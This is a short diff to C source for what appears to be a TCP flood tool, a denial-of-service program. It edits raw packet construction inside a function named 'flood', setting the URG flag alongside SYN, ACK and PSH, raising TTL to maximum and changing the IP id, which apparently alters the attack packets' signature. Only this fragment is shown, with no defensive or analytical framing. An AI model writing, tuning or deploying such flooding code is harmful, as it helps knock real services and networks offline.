@@ -120,6 +120,7 @@ void setup_fin_header(struct tcphdr *tcpHeader)
     tcpHeader->ack = 1;
     tcpHeader->psh = 0;
     tcpHeader->syn = 0;
+    tcpHeader->urg = 0;
     tcpHeader->fin = 1;
     tcpHeader->doff = 5;
     tcpHeader->window = rand();
@@ -136,11 +137,12 @@ void setup_tcp_header(struct tcphdr *tcpHeader)
     tcpHeader->ack = 1;
     tcpHeader->psh = 1;
     tcpHeader->syn = 1;
+    tcpHeader->urg = 1;
     tcpHeader->fin = 0;
     tcpHeader->doff = 5;
     tcpHeader->window = rand();
     tcpHeader->check = 0;
-    tcpHeader->urg_ptr = 0;
+    tcpHeader->urg_ptr = 1;
 }
  
 void *flood(void *par1)
@@ -179,9 +181,9 @@ void *flood(void *par1)
     ipHeader->version = 4;
     ipHeader->tos = 0;
     ipHeader->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength;
-    ipHeader->id = htonl(108642);
+    ipHeader->id = htonl(54321);
     ipHeader->frag_off = 0;
-    ipHeader->ttl = 240;
+    ipHeader->ttl = MAXTTL;
     ipHeader->protocol = 6;
     ipHeader->check = 0;
     ipHeader->saddr = util_external_addr();
@@ -198,9 +200,10 @@ void *flood(void *par1)
     tcpHeader->ack = 1;
     tcpHeader->psh = 1;
     tcpHeader->syn = 1;
+    tcpHeader->urg = 1;
     tcpHeader->window = rand();
     tcpHeader->check = 0;
-    tcpHeader->urg_ptr = 0;
+    tcpHeader->urg_ptr = 1;
 
     psh.source_address = util_external_addr();
     psh.dest_address = sin.sin_addr.s_addr;
